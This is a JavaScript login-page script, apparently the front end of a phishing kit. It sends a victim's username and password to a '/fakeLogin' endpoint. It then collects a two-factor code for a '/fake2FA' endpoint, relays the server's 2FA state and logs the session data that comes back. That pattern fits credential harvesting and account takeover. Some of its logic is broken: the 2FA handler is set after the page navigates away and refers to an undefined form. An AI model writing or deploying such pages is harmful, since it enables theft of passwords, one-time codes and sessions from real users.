document.addEventListener("DOMContentLoaded", function (event) {
    const loginButton = document.getElementById("loginButton");
    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");

    loginButton.onclick = function() {
        const username = usernameInput.value;
        const password = passwordInput.value;

        if (username.trim() === '' || password.trim() === '') {
            alert('Lütfen kullanıcı adı ve şifre alanlarını doldurun.');
            return; // Hata durumunda fonksiyondan çık
        }

        fetch('/fakeLogin', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username: username, password: password })
        })
        .then(response => {
            if (response.ok) {
                return response.json();
            } else {
                throw new Error("Network response was not ok.");
            }
        })
        .then(data => {
            if (data.is_two_factor_required === 'true') {
                var response_json = data.response_json
                window.location.href = '/fake2FA';

                verificationForm.onsubmit = function(event) {
                    event.preventDefault();

                    const verificationCode = Array.from(verificationForm.querySelectorAll('.digit')).map(input => input.value).join('');

                    fetch('/fake2FA', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: username,
                            verification_code: verificationCode,
                            response_json: data.response_json
                        })
                    })
                    .then(response => {
                        if (response.ok) {
                            return response.json();
                        } else {
                            throw new Error("Network response was not ok.");
                        }
                    })
                    .then(data => {
                        if (data.status === "ok") {
                            console.log(data.session_data);
                            console.log("Login successful");
                        } else if (data.status === "fail") {
                            console.log(data.msg);
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                    });
                };
            } else {
                console.log("User does not have 2FA");
                // Handle successful login without two-factor authentication
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
    };
});